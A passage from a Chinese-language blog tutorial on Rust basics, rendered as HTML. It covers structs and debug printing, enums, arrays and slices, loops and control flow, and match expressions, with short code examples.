class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;rect1 is &#123;:?&#125;&quot;</span>, rect1);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">scale</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rectangle &#123;</span><br><span class="line">        width: dbg!(<span class="number">30</span> * scale),</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    dbg!(&amp;rect1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><p>枚举允许你通过列举可能的成员来定义一个<strong>枚举类型</strong>，例如扑克牌花色：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">PokerSuit</span> &#123;</span><br><span class="line">  Clubs,</span><br><span class="line">  Spades,</span><br><span class="line">  Diamonds,</span><br><span class="line">  Hearts,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>枚举类型是一个类型，它会包含所有可能的枚举成员，而枚举值是该类型中的具体某个成员的实例。</strong></p><h5 id="枚举值"><a href="#枚举值" class="headerlink" title="枚举值"></a>枚举值</h5><p>我们通过<code>::</code>来访问枚举类型下的具体成员</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">heart</span> = PokerSuit::Hearts;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">diamond</span> = PokerSuit::Diamonds;</span><br></pre></td></tr></table></figure><p>接下来，我们想让扑克牌变得更加实用，那么需要给每张牌赋予一个值：<code>A</code>(1)-<code>K</code>(13)，这样再加上花色，就是一张真实的扑克牌了，例如红心 A。</p><p>目前来说，枚举值还不能带有值，因此先用结构体来实现：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">PokerSuit</span> &#123;</span><br><span class="line">    Clubs,</span><br><span class="line">    Spades,</span><br><span class="line">    Diamonds,</span><br><span class="line">    Hearts,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">PokerCard</span> &#123;</span><br><span class="line">    suit: PokerSuit,</span><br><span class="line">    value: <span class="type">u8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">c1</span> = PokerCard &#123;</span><br><span class="line">       suit: PokerSuit::Clubs,</span><br><span class="line">       value: <span class="number">1</span>,</span><br><span class="line">   &#125;;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">c2</span> = PokerCard &#123;</span><br><span class="line">       suit: PokerSuit::Diamonds,</span><br><span class="line">       value: <span class="number">12</span>,</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码很好的完成了它的使命，通过结构体 <code>PokerCard</code> 来代表一张牌，结构体的 <code>suit</code> 字段表示牌的花色，类型是 <code>PokerSuit</code> 枚举类型，<code>value</code> 字段代表扑克牌的数值。</p><p>可以吗？可以！好吗？说实话，不咋地，因为还有简洁得多的方式来实现：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">PokerCard</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Clubs</span>(<span class="type">u8</span>),</span><br><span class="line">    <span class="title function_ invoke__">Spades</span>(<span class="type">u8</span>),</span><br><span class="line">    <span class="title function_ invoke__">Diamonds</span>(<span class="type">u8</span>),</span><br><span class="line">    <span class="title function_ invoke__">Hearts</span>(<span class="type">u8</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">c1</span> = PokerCard::<span class="title function_ invoke__">Spades</span>(<span class="number">5</span>);</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">c2</span> = PokerCard::<span class="title function_ invoke__">Diamonds</span>(<span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接将数据信息关联到枚举成员上，省去近一半的代码，这种实现是不是更优雅？</p><p>不仅如此，同一个枚举类型下的不同成员还能持有不同的数据类型，例如让某些花色打印 <code>1-13</code> 的字样，另外的花色打印上 <code>A-K</code> 的字样：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">PokerCard</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Clubs</span>(<span class="type">u8</span>),</span><br><span class="line">    <span class="title function_ invoke__">Spades</span>(<span class="type">u8</span>),</span><br><span class="line">    <span class="title function_ invoke__">Diamonds</span>(<span class="type">char</span>),</span><br><span class="line">    <span class="title function_ invoke__">Hearts</span>(<span class="type">char</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">c1</span> = PokerCard::<span class="title function_ invoke__">Spades</span>(<span class="number">5</span>);</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">c2</span> = PokerCard::<span class="title function_ invoke__">Diamonds</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="同一化类型"><a href="#同一化类型" class="headerlink" title="同一化类型"></a>同一化类型</h5><p>枚举（<code>enum</code>）是 Rust 中一种常用的类型，它可以将不同类型的数据统一为一个枚举类型。通过定义不同的枚举变体，可以将多种类型的数据封装在一个类型中，然后使用模式匹配来解构和统一处理它们。</p><p>例如我们有一个 WEB 服务，需要接受用户的长连接，假设连接有两种：<code>TcpStream</code> 和 <code>TlsStream</code>，但是我们希望对这两个连接的处理流程相同，也就是用同一个函数来处理这两个连接，代码如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">new</span> (stream: TcpStream) &#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = stream;</span><br><span class="line">  <span class="keyword">if</span> tls &#123;</span><br><span class="line">    s = <span class="title function_ invoke__">negotiate_tls</span>(stream)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// websocket是一个WebSocket&lt;TcpStream&gt;或者</span></span><br><span class="line">  <span class="comment">//   WebSocket&lt;native_tls::TlsStream&lt;TcpStream&gt;&gt;类型</span></span><br><span class="line">  websocket = WebSocket::<span class="title function_ invoke__">from_raw_socket</span>(</span><br><span class="line">    s, ......)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，枚举类型就能帮上大忙：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Websocket</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">Tcp</span>(Websocket&lt;TcpStream&gt;),</span><br><span class="line">  <span class="title function_ invoke__">Tls</span>(Websocket&lt;native_tls::TlsStream&lt;TcpStream&gt;&gt;),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>在Rust中，最常用的数组有两种，第一种是速度很快但是长度固定的array，第二种是可动态增长的但是有性能损耗的Vector，我们将前面的array称之为数组，将后面的Vector称之为动态数组</p><p>数组的具体定义很简单：将多个类型相同的元素依次组合在一起，就是一个数组，数组具有以下三要素：</p><ul><li>长度固定</li><li>元素必须有相同的类型</li><li>依次线性排列</li></ul><p><strong>我们这里说的数组是 Rust 的基本类型，是固定长度的，这点与其他编程语言不同，其它编程语言的数组往往是可变长度的，与 Rust 中的动态数组 <code>Vector</code> 类似</strong></p><p><strong>创建数组</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为数组声明类型</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span>: [<span class="type">i32</span>; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//用;进行分隔，前面是值，后面是出现的次数</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span>=[<span class="number">3</span>;<span class="number">5</span>]</span><br></pre></td></tr></table></figure><p><strong>访问数组元素</strong></p><p>更其他语言一样，用索引来访问</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问数组的第一个元素</p><p>注意：<strong>数组元素是非基本类型</strong></p><p><strong>数组切片</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span>: [<span class="type">i32</span>; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">slice</span>: &amp;[<span class="type">i32</span>] = &amp;a[<span class="number">1</span>..<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert_eq!</span>(slice, &amp;[<span class="number">2</span>, <span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p>上面的数组切片 <code>slice</code> 的类型是<code>&amp;[i32]</code>，与之对比，数组的类型是<code>[i32;5]</code>，简单总结下切片的特点：</p><ul><li>切片的长度可以与数组不同，并不是固定的，而是取决于你使用时指定的起始和结束位置</li><li>创建切片的代价非常小，因为切片只是针对底层数组的一个引用</li><li>切片类型 [T] 拥有不固定的大小，而切片引用类型 &amp;[T] 则具有固定的大小，因为 Rust 很多时候都需要固定大小数据类型，因此 &amp;[T] 更有用，<code>&amp;str</code> 字符串切片也同理</li></ul><h3 id="流程控制（语句学习）"><a href="#流程控制（语句学习）" class="headerlink" title="流程控制（语句学习）"></a>流程控制（语句学习）</h3><h4 id="1-if语句"><a href="#1-if语句" class="headerlink" title="1.if语句"></a>1.if语句</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition == <span class="literal">true</span> &#123;</span><br><span class="line">    <span class="comment">// A...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// B...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-if-else语句"><a href="#2-if-else语句" class="headerlink" title="2.if-else语句"></a>2.if-else语句</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">n</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 4&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> n % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 3&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 2&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;number is not divisible by 4, 3, or 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-for循环"><a href="#3-for循环" class="headerlink" title="3.for循环"></a>3.for循环</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">1</span>..=<span class="number">5</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>1..=5</code>的意思是1到5（包括5），<code>1..5</code>意思是1到5（不包括5）</p><p>注意，使用 <code>for</code> 时我们往往使用集合的引用形式，除非你不想在后面的代码中继续使用该集合（比如我们这里使用了 <code>container</code> 的引用）。如果不使用引用的话，所有权会被转移（move）到 <code>for</code> 语句块中，后面就无法再使用这个集合了)：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">item</span> <span class="keyword">in</span> &amp;container &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想在循环中，<strong>修改该元素</strong>，可以使用 <code>mut</code> 关键字：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">item</span> <span class="keyword">in</span> &amp;<span class="keyword">mut</span> collection &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结如下：</p><table><thead><tr><th>使用方法</th><th>等价使用方式</th><th>所有权</th></tr></thead><tbody><tr><td><code>for item in collection</code></td><td><code>for item in IntoIterator::into_iter(collection)</code></td><td>转移所有权</td></tr><tr><td><code>for item in &amp;collection</code></td><td><code>for item in collection.iter()</code></td><td>不可变借用</td></tr><tr><td><code>for item in &amp;mut collection</code></td><td><code>for item in collection.iter_mut()</code></td><td>可变借用</td></tr></tbody></table><p>如果想在循环中<strong>获取元素的索引</strong>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// `.iter()` 方法把 `a` 数组变成一个迭代器</span></span><br><span class="line">    <span class="keyword">for</span> (i, v) <span class="keyword">in</span> a.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;第&#123;&#125;个元素是&#123;&#125;&quot;</span>, i + <span class="number">1</span>, v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然如果我们想用 <code>for</code> 循环控制某个过程执行 10 次，但是又不想单独声明一个变量来控制这个流程</p><p>我们用_来代替那个变量</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">_</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-continue"><a href="#4-continue" class="headerlink" title="4.continue"></a>4.continue</h4><p>使用continue可以跳过当前循环，开始下一次循环</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">1</span>..<span class="number">4</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">2</span> &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-break"><a href="#5-break" class="headerlink" title="5.break"></a>5.break</h4><p>使用break跳出当前整个循环</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">1</span>..<span class="number">4</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">2</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-while循环"><a href="#6-while循环" class="headerlink" title="6.while循环"></a>6.while循环</h4><p>跟c的差不多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut n = 0;</span><br><span class="line"></span><br><span class="line">    while n &lt;= 5  &#123;</span><br><span class="line">        println!(&quot;&#123;&#125;!&quot;, n);</span><br><span class="line"></span><br><span class="line">        n = n + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println!(&quot;我出来了！&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7-loop循环"><a href="#7-loop循环" class="headerlink" title="7.loop循环"></a>7.loop循环</h4><p>简单的无限循环，我们可以在其内部设置break决定何时结束循环</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无限的again!,知道crtl+c跳出循环</span></span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">counter</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = <span class="keyword">loop</span> &#123;</span><br><span class="line">        counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The result is &#123;&#125;&quot;</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有几点值得注意：</p><ul><li><strong>break 可以单独使用，也可以带一个返回值</strong>，有些类似 <code>return</code></li><li><strong>loop 是一个表达式</strong>，因此可以返回一个值</li></ul><h3 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h3><h4 id="match和if-let"><a href="#match和if-let" class="headerlink" title="match和if let"></a>match和if let</h4><h5 id="match匹配"><a href="#match匹配" class="headerlink" title="match匹配"></a>match匹配</h5><p>先看看match的通用形式：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> target &#123;</span><br><span class="line">    模式<span class="number">1</span> =&gt; 表达式<span class="number">1</span>,</span><br><span class="line">    模式<span class="number">2</span> =&gt; &#123;</span><br><span class="line">        语句<span class="number">1</span>;</span><br><span class="line">        语句<span class="number">2</span>;</span><br><span class="line">        表达式<span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    _ =&gt; 表达式<span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>match</code> 允许我们将一个值与一系列的模式相比较，并根据相匹配的模式执行对应的代码</p><p>我们来看一个例子</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Coin</span> &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">value_in_cents</span>(coin: Coin) <span class="punctuation">-&gt;</span> <span class="type">u8</span> &#123;</span><br><span class="line">    <span class="keyword">match</span> coin &#123;</span><br><span class="line">        Coin::Penny =&gt;  &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;Lucky penny!&quot;</span>);</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// 调用 value_in_cents 函数，传入一个 Coin::Penny 枚举值</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">penny_value</span> = <span class="title function_ invoke__">value_in_cents</span>(Coin::Penny);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a penny is: &#123;&#125; cents&quot;</span>, penny_value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 你也可以调用其他硬币类型的 value_in_cents</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">nickel_value</span> = <span class="title function_ invoke__">value_in_cents</span>(Coin::Nickel);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a nickel is: &#123;&#125; cents&quot;</span>, nickel_value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><code>value_in_cents</code> 函数根据匹配到的硬币，返回对应的美分数值。<code>match</code> 后紧跟着的是一个表达式，跟 <code>if</code> 很像，但是 <code>if</code> 后的表达式必须是一个布尔值，而 <code>match</code> 后的表达式返回值可以是任意类型，只要能跟后面的分支中的模式匹配起来即可，这里的 <code>coin</code> 是枚举 <code>Coin</code> 类型</p><p>接下来是match的分支。一个分支有两个部分：一<strong>个模式和针对该模式的处理代码</strong>。第一个分支的模式是 <code>Coin::Penny</code>，其后的 <code>=&gt;</code> 运算符将模式和将要运行的代码分开。这里的代码就仅仅是表达式 <code>1</code>，不同分支之间使用逗号分隔。</p><p>当 <code>match</code> 表达式执行时，它将目标值 <code>coin</code> 按顺序依次与每一个分支的模式相比较，如果模式匹配了这个值，那么模式之后的代码将被执行。如果模式并不匹配这个值，将继续执行下一个分支。</p><p>每个分支相关联的代码是一个表达式，而表达式的结果值将作为整个 <code>match</code> 表达式的返回值。如果分支有多行代码，那么需要用 <code>&#123;&#125;</code> 包裹，同时最后一行代码需要是一个表达式。</p></blockquote><p>简单来说就是在下面main中的传入value_in_cents的值，匹配到啥，就输出啥</p><h5 